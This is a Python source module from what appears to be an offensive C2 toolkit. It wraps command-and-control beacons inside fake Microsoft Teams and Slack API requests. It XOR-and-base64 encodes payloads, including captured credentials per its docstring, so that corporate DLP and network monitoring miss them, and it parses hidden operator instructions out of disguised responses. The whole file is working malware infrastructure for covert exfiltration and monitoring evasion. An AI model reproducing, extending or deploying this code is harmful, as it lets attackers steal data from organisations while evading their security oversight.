"""SaaS traffic mimicry — C2 beacon wrappers for Teams and Slack.

Corporate network monitoring (Zscaler, Palo Alto, Cisco Umbrella, Microsoft
Defender for Cloud Apps) is calibrated to recognise legitimate SaaS API
traffic from Microsoft Teams and Slack. A C2 beacon that wraps its data inside
a real Teams ``activityNotifications`` call or a Slack ``chat.postMessage``
call is indistinguishable from the thousands of legitimate SaaS API calls
every employee makes each day.

This module builds request descriptors (URL, headers, body) that mimic these
SaaS APIs and parses their responses for C2 instructions. The beacon payload
itself is obfuscated with XOR + base64 before placement so that even if the
body is inspected by a DLP rule it reads as an opaque string, not structured
C2 data.

Only stdlib (``json``, ``base64``, ``hashlib``) is used for encoding so the
module has no third-party dependencies.
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import os

logger = logging.getLogger("dropoutjeep")

# ---------------------------------------------------------------------------
# Defaults
# ---------------------------------------------------------------------------

# Default XOR key used for beacon obfuscation when the caller does not supply
# one. This is a static value; for higher assurance pass an explicit key
# (ideally derived per-session) to encode_beacon_data / decode_beacon_data.
DEFAULT_XOR_KEY = "dropoutjeep-default-key"

# Teams C2 endpoint. The real Teams client posts activity notifications to
# ``*.teams.microsoft.com/v1/me/activityNotifications``; the ``clientData``
# field is an opaque client-side blob that the service echoes back, making it
# an ideal covert channel for beacon data.
TEAMS_API_HOST = "teams.microsoft.com"
TEAMS_API_PATH = "/v1/me/activityNotifications"
TEAMS_API_URL = f"https://{TEAMS_API_HOST}{TEAMS_API_PATH}"

# Slack C2 endpoint. ``chat.postMessage`` is one of the highest-volume Slack
# API calls in any enterprise. The beacon payload is base64-encoded into the
# ``text`` field, which Slack renders as message content — corporate DLP sees
# an ordinary (if long) chat message.
SLACK_API_HOST = "slack.com"
SLACK_API_PATH = "/api/chat.postMessage"
SLACK_API_URL = f"https://{SLACK_API_HOST}{SLACK_API_PATH}"

# Marker prefix used to disambiguate C2 instructions embedded in a SaaS
# response. The parser looks for this prefix in the relevant text field.
_C2_MARKER = "djcmd:"

# Default User-Agent strings that match the real SaaS client libraries.
_TEAMS_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Teams/1.0"
_SLACK_UA = "Python/3.11 slackclient/3.0"


# ---------------------------------------------------------------------------
# Beacon data encoding (XOR + base64)
# ---------------------------------------------------------------------------

def _xor_bytes(data: bytes, key: bytes) -> bytes:
    """XOR ``data`` with a repeating ``key``."""
    if not key:
        raise ValueError("XOR key must not be empty")
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def encode_beacon_data(data: dict, key: str = DEFAULT_XOR_KEY) -> str:
    """Encode a beacon payload dict into an opaque transport string.

    The dict is serialised to JSON, XOR'd with ``key``, then base64-encoded.
    The result is a plain ASCII string safe to drop into a JSON text field or
    an API ``clientData`` blob. Corporate inspection sees a random-looking
    base64 string, not structured C2 data.

    Args:
        data: Arbitrary JSON-serialisable beacon payload (e.g. host info,
            captured credentials, task output).
        key: XOR key. Defaults to :data:`DEFAULT_XOR_KEY`.

    Returns:
        Base64-encoded, XOR-obfuscated string.
    """
    if not isinstance(data, dict):
        raise TypeError("data must be a dict")
    raw = json.dumps(data, separators=(",", ":"), sort_keys=True).encode("utf-8")
    xored = _xor_bytes(raw, key.encode("utf-8"))
    encoded = base64.b64encode(xored).decode("ascii")
    logger.debug("Encoded beacon payload (%d bytes -> %d chars)", len(raw), len(encoded))
    return encoded


def decode_beacon_data(encoded: str, key: str = DEFAULT_XOR_KEY) -> dict:
    """Reverse :func:`encode_beacon_data`.

    Args:
        encoded: The base64 string produced by :func:`encode_beacon_data` (or
            received from the C2 channel).
        key: XOR key used during encoding. Must match.

    Returns:
        The original payload dict.

    Raises:
        ValueError: if the string cannot be decoded (bad base64, wrong key,
            or not valid JSON after decryption).
    """
    if not isinstance(encoded, str) or not encoded:
        raise ValueError("encoded must be a non-empty string")
    try:
        xored = base64.b64decode(encoded.encode("ascii"), validate=True)
    except Exception as exc:
        raise ValueError(f"base64 decode failed: {exc}") from exc
    raw = _xor_bytes(xored, key.encode("utf-8"))
    try:
        data = json.loads(raw.decode("utf-8"))
    except Exception as exc:
        raise ValueError(
            "JSON decode failed after XOR — wrong key or corrupted payload"
        ) from exc
    if not isinstance(data, dict):
        raise ValueError("decoded payload is not a dict")
    return data


# ---------------------------------------------------------------------------
# Microsoft Teams beacon builder / parser
# ---------------------------------------------------------------------------

def build_teams_beacon(data: dict, token: str | None = None) -> dict:
    """Build a Teams-format request descriptor carrying a C2 beacon.

    The request mimics a real Teams activity-notification POST. The beacon
    payload (XOR+base64) is placed in the ``clientData`` field, which Teams
    treats as an opaque client-side string and does not semantically inspect.

    Args:
        data: Beacon payload dict to exfiltrate.
        token: Optional Teams user token. If provided, an
            ``Authorization: Bearer <token>`` header is included so the
            request looks fully authenticated. If omitted, a synthetic token
            is generated to keep the header shape realistic.

    Returns:
        ``{"url": str, "headers": dict, "body": dict}`` ready to be sent via
        an HTTP client (e.g. ``httpx``).
    """
    encoded = encode_beacon_data(data)
    # Synthetic but realistic-looking token when none is supplied. This keeps
    # the Authorization header present (Teams clients always send one) without
    # requiring real credentials for the request to be structurally valid.
    auth_token = token or _synthetic_token("teams", encoded)
    body = {
        "activityNotifications": [
            {
                "target": "activityHistoryService",
                "activityType": "beacon",
                "clientData": encoded,
                "contentUrl": "https://teams.microsoft.com/lobby",
            }
        ],
    }
    headers = {
        "Authorization": f"Bearer {auth_token}",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": _TEAMS_UA,
        "Accept-Language": "en-US",
        "X-Ms-Teams-Client-Version": "1.0.0",
    }
    logger.debug("Built Teams beacon (%d bytes payload)", len(encoded))
    return {
        "url": TEAMS_API_URL,
        "headers": headers,
        "body": body,
    }


def parse_teams_response(response_body: str) -> dict:
    """Parse a Teams response for embedded C2 instructions.

    The operator's C2 server responds to the fronted Teams-format request with
    a body that looks like a legitimate Teams activity response. C2
    instructions are encoded with :func:`encode_beacon_data` and embedded in
    a ``clientData``-shaped field, prefixed with :data:`_C2_MARKER`.

    Args:
        response_body: Raw response body text (JSON or plain).

    Returns:
        Decoded instruction dict, or an empty dict if no instructions were
        found.
    """
    candidate = _extract_encoded_candidate(response_body, ("clientData",))
    if candidate is None:
        return {}
    try:
        return decode_beacon_data(candidate)
    except ValueError as exc:
        logger.warning("Failed to decode Teams C2 response: %s", exc)
        return {}


# ---------------------------------------------------------------------------
# Slack beacon builder / parser
# ---------------------------------------------------------------------------

def build_slack_beacon(data: dict, bot_token: str | None = None) -> dict:
    """Build a Slack-format request descriptor carrying a C2 beacon.

    The request mimics a real Slack ``chat.postMessage`` call. The beacon
    payload (XOR+base64) is placed in the ``text`` field, which Slack renders
    as message content. To a DLP rule this is an ordinary chat message.

    Args:
        data: Beacon payload dict to exfiltrate.
        bot_token: Optional Slack bot token (``xoxb-...``). If provided, the
            ``Authorization`` header uses it; otherwise a synthetic token is
            generated to keep the request shape realistic.

    Returns:
        ``{"url": str, "headers": dict, "body": dict}``.
    """
    encoded = encode_beacon_data(data)
    token = bot_token or _synthetic_token("slack", encoded, prefix="xoxb-")
    body = {
        "channel": _synthetic_channel_id(),
        "text": encoded,
        "as_user": "true",
        # Slack allows arbitrary metadata via the unfurls/payload fields; we do
        # not use them but include a realistic shape.
        "unfurl_links": "false",
    }
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "User-Agent": _SLACK_UA,
    }
    logger.debug("Built Slack beacon (%d bytes payload)", len(encoded))
    return {
        "url": SLACK_API_URL,
        "headers": headers,
        "body": body,
    }


def parse_slack_response(response_body: str) -> dict:
    """Parse a Slack response for embedded C2 instructions.

    The C2 server responds with a body shaped like the Slack ``chat.postMessage``
    success envelope (``{"ok": true, ...}``) with the encoded instructions
    embedded in the ``message.text`` field, prefixed with :data:`_C2_MARKER`.

    Args:
        response_body: Raw response body text (JSON or plain).

    Returns:
        Decoded instruction dict, or an empty dict if none found.
    """
    candidate = _extract_encoded_candidate(response_body, ("text",))
    if candidate is None:
        return {}
    try:
        return decode_beacon_data(candidate)
    except ValueError as exc:
        logger.warning("Failed to decode Slack C2 response: %s", exc)
        return {}


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _synthetic_token(provider: str, seed: str, *, prefix: str = "") -> str:
    """Generate a realistic-looking but fake auth token.

    The result is deterministic per (provider, seed) so the same beacon
    payload always yields the same token — useful for replay/debugging. It is
    never used to authenticate against a real service.
    """
    digest = hashlib.sha256(f"{provider}:{seed}".encode("utf-8")).hexdigest()
    # Slack tokens are ~24 chars after the prefix; Teams tokens are longer.
    body = digest[:24] if provider == "slack" else digest[:48]
    return f"{prefix}{body}"


def _synthetic_channel_id() -> str:
    """Generate a realistic-looking Slack channel ID (e.g. C0123ABCDEF)."""
    digest = hashlib.sha256(os.urandom(16)).hexdigest()[:9].upper()
    return f"C{digest}"


def _extract_encoded_candidate(body: str, field_names: tuple[str, ...]) -> str | None:
    """Find and return the encoded C2 string embedded in a response body.

    The string may appear either:
      - as the value of a JSON field named in ``field_names`` (possibly
        prefixed with :data:`_C2_MARKER`), or
      - inline anywhere in the body prefixed with :data:`_C2_MARKER`.

    Returns ``None`` if no candidate is found.
    """
    if not body:
        return None

    # Try JSON parsing first — the common case for both Teams and Slack.
    try:
        payload = json.loads(body)
    except (ValueError, TypeError):
        payload = None

    if isinstance(payload, dict):
        for field in field_names:
            value = _find_field(payload, field)
            if isinstance(value, str):
                candidate = value
                if candidate.startswith(_C2_MARKER):
                    candidate = candidate[len(_C2_MARKER):]
                if _looks_like_b64(candidate):
                    return candidate

    # Fall back to a marker scan across the raw body (handles non-JSON or
    # nested placements the field walk missed).
    if _C2_MARKER in body:
        idx = body.index(_C2_MARKER) + len(_C2_MARKER)
        # Grab the longest base64-looking run starting at the marker.
        candidate = ""
        for ch in body[idx:]:
            if ch.isalnum() or ch in "+/=":
                candidate += ch
            elif candidate:
                break
        if _looks_like_b64(candidate):
            return candidate

    return None


def _find_field(obj: object, name: str) -> object:
    """Recursively search a JSON-like structure for the first ``name`` value."""
    if isinstance(obj, dict):
        if name in obj:
            return obj[name]
        for value in obj.values():
            found = _find_field(value, name)
            if found is not None:
                return found
    elif isinstance(obj, list):
        for item in obj:
            found = _find_field(item, name)
            if found is not None:
                return found
    return None


def _looks_like_b64(candidate: str) -> bool:
    """Cheap check that a string is plausible base64 (len % 4 == 0, allowed
    charset). Not a strict validator but sufficient to avoid false hits."""
    if len(candidate) < 4:
        return False
    if len(candidate) % 4 != 0:
        # base64 with no padding may still decode; allow it.
        pass
    allowed = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")
    return all(c in allowed for c in candidate)
